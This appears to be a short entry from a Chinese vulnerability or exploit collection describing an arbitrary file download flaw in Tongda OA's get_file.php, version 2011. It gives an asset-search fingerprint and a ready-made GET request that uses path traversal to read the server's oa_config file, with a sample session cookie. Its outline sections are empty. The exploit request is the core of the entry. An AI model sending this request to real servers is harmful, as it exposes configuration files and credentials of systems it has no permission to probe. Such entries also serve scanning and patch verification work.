# 通达OAget_file.php任意文件下载漏洞

- **系统**：通达OA　|　**类型**：其他　|　**CVE**：—
- **指纹**：`app.name="通达 OA"`
- **请求**：`GET /module/AIP/get_file.php?MODULE=/&ATTACHMENT_NAME=php&ATTACHMENT_ID=.._webroot/inc/oa_config HTTP/1.1`
- **关键头**：`Host: {hostname}`　`Cookie: PHPSESSID=lrvmku93t8g0ce7b90qaroic96; KEY_RANDOMDATA=10603`

**请求体 / payload**
```

```

**其他**
- 通达OA get\_file.php 任意文件下载漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 通达OA2011